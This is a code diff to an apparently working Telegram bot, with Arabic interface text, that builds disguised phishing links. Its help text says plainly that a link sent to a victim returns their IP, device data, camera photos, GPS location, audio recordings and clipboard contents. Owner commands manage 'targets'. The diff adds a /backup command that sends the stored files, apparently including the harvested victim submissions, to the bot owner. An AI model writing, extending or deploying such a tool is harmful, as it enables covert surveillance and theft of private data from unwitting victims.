@@ -822,7 +822,7 @@ bot.on('message', async (msg) => {
   if (msg.text === "/help") {
     let t = `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك فوراً:\n   ⚡ IP + تفاصيل ISP والدولة\n   📱 بيانات الجهاز الكاملة\n   📷 صور (أمامية + خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n🔗 أنواع الروابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n   📁 Google Drive\n\n📊 /mystats — إحصائياتك الشخصية\n\n⚡ Powered by @Ye_x00`;
     if (chatId === BOT_OWNER) {
-      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات الكاملة\n/report — تقرير شامل فوري\n/features — 🎛️ التحكم بالميزات\n/users — المستخدمون (مع الأسماء)\n/search [نص] — 🔍 بحث بالاسم أو اليوزر\n/export — تصدير شامل كملف\n/info [id] — معلومات مستخدم\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/note [id] [نص] — إضافة ملاحظة\n/notes [id] — عرض الملاحظات\n/delnotes [id] — حذف الملاحظات\n/silent — الوضع الصامت 🔕\n/away [نص] — وضع الغياب\n/awayoff — إيقاف الغياب\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/clearstats — مسح الإحصائيات\n/ping — اختبار السرعة`;
+      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات الكاملة\n/report — تقرير شامل فوري\n/features — 🎛️ التحكم بالميزات\n/users — المستخدمون (مع الأسماء)\n/search [نص] — 🔍 بحث بالاسم أو اليوزر\n/export — تصدير شامل كملف\n/info [id] — معلومات مستخدم\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/note [id] [نص] — إضافة ملاحظة\n/notes [id] — عرض الملاحظات\n/delnotes [id] — حذف الملاحظات\n/silent — الوضع الصامت 🔕\n/away [نص] — وضع الغياب\n/awayoff — إيقاف الغياب\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/clearstats — مسح الإحصائيات\n/ping — اختبار السرعة\n/backup — 💾 نسخة احتياطية كاملة`;
     }
     return bot.sendMessage(chatId, t);
   }
@@ -1105,6 +1105,26 @@ bot.on('message', async (msg) => {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const s=Date.now(); const m=await bot.sendMessage(chatId,"🏓 Pong!");
     return bot.editMessageText(`🏓 Pong! \`${Date.now()-s}ms\``,{chat_id:chatId,message_id:m.message_id,parse_mode:"Markdown"});
+  }
+
+  if (msg.text === "/backup") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const backupFiles = [
+      PAGE_CONFIG_FILE, SUBMISSIONS_FILE, USER_PAGES_FILE,
+      USER_SUBS_FILE, PREMIUM_FILE, "settings.json",
+      "users.json", "profiles.json", "stats.json", "userstats.json"
+    ];
+    await bot.sendMessage(chatId, "💾 جاري إرسال النسخة الاحتياطية الكاملة...");
+    let sent = 0, failed = 0;
+    for (const f of backupFiles) {
+      try {
+        if (require("fs").existsSync(f)) {
+          await bot.sendDocument(chatId, require("fs").createReadStream(f), {}, { filename: f, contentType: "application/json" });
+          sent++;
+        }
+      } catch(e) { failed++; }
+    }
+    return bot.sendMessage(chatId, `✅ اكتملت النسخة الاحتياطية\n📁 ملفات مُرسلة: ${sent}\n❌ فشل: ${failed}\n\n⏰ ${new Date().toLocaleString("ar-SA")}`);
   }
 
   if (msg.text?.startsWith("/setwelcome ")) {
